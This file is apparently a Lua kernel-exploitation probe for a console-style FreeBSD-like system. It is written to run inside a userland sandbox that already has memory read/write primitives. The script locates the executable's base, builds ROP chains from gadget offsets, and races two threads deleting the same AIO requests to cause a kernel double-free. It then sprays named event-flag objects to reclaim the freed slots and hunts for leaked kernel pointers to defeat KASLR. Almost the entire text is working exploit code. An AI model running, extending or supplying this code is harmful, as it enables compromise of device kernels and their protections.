-- CRASH_CLASS: HIGH
-- PROBE 77g: prolapse cross-subsystem — AIO double-free + EVF reclaim
--
-- 77f: double-free works (24/30 iters) but same-type reclaim shows 0 anomalies
-- because AIO generation-checked IDs prevent accessing reused memory.
--
-- Strategy: double-free AIO entry (128B zone), then spray named EVFs (~118B → 128B)
-- to reclaim the slot. EVF init_pattern is written into the kernel object.
-- If the freed AIO slot is reclaimed by an EVF, trywait should read our pattern.
-- More importantly: R sub-object (48B/64B zone) stores kernel thread pointers
-- at +0x00 and +0x08 that aren't zeroed before free. If EVF overlaps R,
-- trywait might return those kernel pointers.
--
-- Note: EVF is 128B, R is 64B — different zones. This probe targets the I/Q
-- entry object (128B), not R. The kernel pointers in R need a 64B spray.

print("=== PROBE 77g: PROLAPSE EVF CROSS-RECLAIM ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l = get_hi_lo(val)
    return string.format("0x%08X%08X", h, l)
end
local function sgn(v)
    local l = N(v)
    if l >= 0x80000000 then l = l - 0x100000000 end
    return l
end
local function put_str(s)
    local p = memory.alloc(#s + 2)
    for i = 1, #s do
        pcall(function() memory.write_byte(N(p) + i - 1, string.byte(s, i)) end)
    end
    pcall(function() memory.write_byte(N(p) + #s, 0) end)
    return p
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
local eb = uint64(string.format("0x%X%08X", ehi, elo))

local g_pop_rax = eb + 0x992
local g_pop_rdi = eb + 0xC9DFE
local g_pop_rsi = eb + 0xD77D
local g_pop_rdx = eb + 0x3B02D7
local g_bare_ret = eb + 0x42
local g_mov_m_rax = eb + 0x92C67

local sa = memory.alloc(0x20)
wq(N(sa), uint64(1)); wd(N(sa) + 8, 0); wq(N(sa) + 16, uint64(0))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

local fd_zero = sgn(mk(5)(put_str("/dev/zero"), uint64(0), uint64(0)))
print("fd_zero=" .. fd_zero)

local reqs = memory.alloc(0x30)
local data_buf = memory.alloc(0x1000)
local result_buf = memory.alloc(0x100)
local one_id = memory.alloc(8)
local one_st = memory.alloc(8)
local evf_result = memory.alloc(0x10)

local function submit_one()
    wq(N(reqs), uint64(0))
    wq(N(reqs) + 8, uint64(16))
    local bh, bl = get_hi_lo(uint64(N(data_buf)))
    wd(N(reqs) + 0x10, bl); wd(N(reqs) + 0x14, bh)
    local rh, rl = get_hi_lo(uint64(N(result_buf)))
    wd(N(reqs) + 0x18, rl); wd(N(reqs) + 0x1C, rh)
    wd(N(reqs) + 0x20, fd_zero); wd(N(reqs) + 0x24, 0)
    wd(N(one_id), 0)
    pcall(function()
        mk(669)(uint64(1), uint64(N(reqs)), uint64(1), uint64(1), uint64(N(one_id)))
    end)
    return rd(N(one_id)) or 0
end

local function poll_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(664)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

local function delete_one(id)
    wd(N(one_id), id); wd(N(one_st), 0xDEAD)
    pcall(function() mk(662)(uint64(N(one_id)), uint64(1), uint64(N(one_st))) end)
    return rd(N(one_st)) or 0
end

-- Pre-drain
print("")
print("[0] Pre-drain")
for i = 1, 64 do
    local id = submit_one()
    if id ~= 0 then poll_one(id); delete_one(id) end
end
print("  done")

-- Race iterations with EVF cross-reclaim
print("")
print("[1] RACE + EVF CROSS-RECLAIM")
local ITERS = 15
local BATCH = 16
local del_ids = memory.alloc(4 * BATCH + 0x10)
local states_A = memory.alloc(4 * BATCH + 0x10)
local states_B = memory.alloc(4 * BATCH + 0x10)

local total_doubles = 0
local total_kptrs = 0
local evf_name_counter = 0

for iter = 1, ITERS do
    if not alive() then print("DEAD at iter " .. iter); break end

    local ids = {}
    for i = 1, BATCH do
        local id = submit_one()
        if id ~= 0 then poll_one(id); ids[#ids + 1] = id end
    end
    if #ids < 4 then print("  too few: " .. #ids); break end
    local count = #ids

    for i = 0, count - 1 do
        wd(N(del_ids) + i * 4, ids[i + 1])
        wd(N(states_A) + i * 4, 0xAAAAAAAA)
        wd(N(states_B) + i * 4, 0xBBBBBBBB)
    end

    -- Two children race-delete
    local stk_A = memory.alloc(0x4000)
    local sb_A = N(stk_A)
    local rsp_A = sb_A + 0x2000 - ((sb_A + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_A + i, 0) end
    local oA = 0
    local function emA(v) wq(rsp_A + oA, v); oA = oA + 8 end
    emA(g_pop_rdi); emA(uint64(N(del_ids)))
    emA(g_pop_rsi); emA(uint64(count))
    emA(g_pop_rdx); emA(uint64(N(states_A)))
    emA(g_pop_rax); emA(uint64(662)); emA(stub)
    emA(g_pop_rdi); emA(uint64(0)); emA(g_pop_rax); emA(uint64(431)); emA(stub)

    local stk_B = memory.alloc(0x4000)
    local sb_B = N(stk_B)
    local rsp_B = sb_B + 0x2000 - ((sb_B + 0x2000) % 16) - 8
    for i = 0, 0x1FFC, 4 do wd(sb_B + i, 0) end
    local oB = 0
    local function emB(v) wq(rsp_B + oB, v); oB = oB + 8 end
    emB(g_pop_rdi); emB(uint64(N(del_ids)))
    emB(g_pop_rsi); emB(uint64(count))
    emB(g_pop_rdx); emB(uint64(N(states_B)))
    emB(g_pop_rax); emB(uint64(662)); emB(stub)
    emB(g_pop_rdi); emB(uint64(0)); emB(g_pop_rax); emB(uint64(431)); emB(stub)

    local par_A = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_A) + i, 0) end
    wq(N(par_A), g_bare_ret)
    wq(N(par_A) + 0x10, uint64(sb_A)); wq(N(par_A) + 0x18, uint64(0x2000))
    local tA = memory.alloc(8); wq(N(tA), uint64(0)); wq(N(par_A) + 0x30, tA)

    local par_B = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(par_B) + i, 0) end
    wq(N(par_B), g_bare_ret)
    wq(N(par_B) + 0x10, uint64(sb_B)); wq(N(par_B) + 0x18, uint64(0x2000))
    local tB = memory.alloc(8); wq(N(tB), uint64(0)); wq(N(par_B) + 0x30, tB)

    pcall(function() mk(455)(par_A, uint64(0x38)) end)
    pcall(function() mk(455)(par_B, uint64(0x38)) end)

    for w = 1, 50000 do local _ = rd(sb_A) end

    -- Count doubles
    local doubles = 0
    for i = 0, count - 1 do
        local sA = rd(N(states_A) + i * 4) or 0xAAAAAAAA
        local sB = rd(N(states_B) + i * 4) or 0xBBBBBBBB
        if sA == 0 and sB == 0 then doubles = doubles + 1 end
    end
    total_doubles = total_doubles + doubles

    if doubles > 0 then
        -- *** CROSS-RECLAIM: spray EVFs into the freed 128B slots ***
        local spray_evfs = {}
        local SPRAY_N = doubles * 8 + 32
        for s = 1, SPRAY_N do
            evf_name_counter = evf_name_counter + 1
            local name = put_str(string.format("p%03d", evf_name_counter))
            local ret = nil
            pcall(function()
                ret = mk(538)(uint64(N(name)), uint64(0x120), uint64(0x41410000 + evf_name_counter))
            end)
            local rv = ret and sgn(ret) or -999
            if rv >= 0 then spray_evfs[#spray_evfs + 1] = rv end
        end

        -- Read back EVF state — look for kernel pointers
        local found_kptr = false
        for s = 1, #spray_evfs do
            wd(N(evf_result), 0); wd(N(evf_result)+4, 0); wd(N(evf_result)+8, 0); wd(N(evf_result)+12, 0)
            local ret = nil
            pcall(function()
                ret = mk(543)(uint64(spray_evfs[s]), uint64(0xFFFFFFFF), uint64(0x01), uint64(N(evf_result)))
            end)
            local rv = ret and sgn(ret) or -999
            local r0 = rd(N(evf_result)) or 0
            local r1 = rd(N(evf_result)+4) or 0
            -- Check for kernel pointers in the result
            if r1 >= 0xFFFF8000 then
                total_kptrs = total_kptrs + 1
                found_kptr = true
                print(string.format("  iter %d: *** KPTR in EVF h=%d: 0x%08X%08X ***",
                    iter, spray_evfs[s], r1, r0))
            end
            -- Also check if result differs from our init pattern
            local expected_lo = (0x41410000 + evf_name_counter - #spray_evfs + s) % 0x100000000
            if r0 ~= 0 and r0 ~= expected_lo and rv == 0 and not found_kptr then
                print(string.format("  iter %d: EVF h=%d unexpected: 0x%08X (expected ~0x%08X)",
                    iter, spray_evfs[s], r0, expected_lo))
            end
        end

        -- Cleanup EVFs
        for s = 1, #spray_evfs do
            pcall(function() mk(539)(uint64(spray_evfs[s])) end)
        end

        print(string.format("  iter %d: %d doubles, %d EVF sprayed%s",
            iter, doubles, #spray_evfs, found_kptr and " ***KPTR***" or ""))
    else
        if iter <= 2 or iter == ITERS then
            print(string.format("  iter %d: clean", iter))
        end
    end
end

print("")
print(string.format("doubles=%d kptrs=%d alive=%s", total_doubles, total_kptrs, alive() and "Y" or "N"))
if total_kptrs > 0 then
    print("*** KASLR DEFEATED VIA CROSS-SUBSYSTEM RECLAIM ***")
end
print("=== 77g COMPLETE ===")
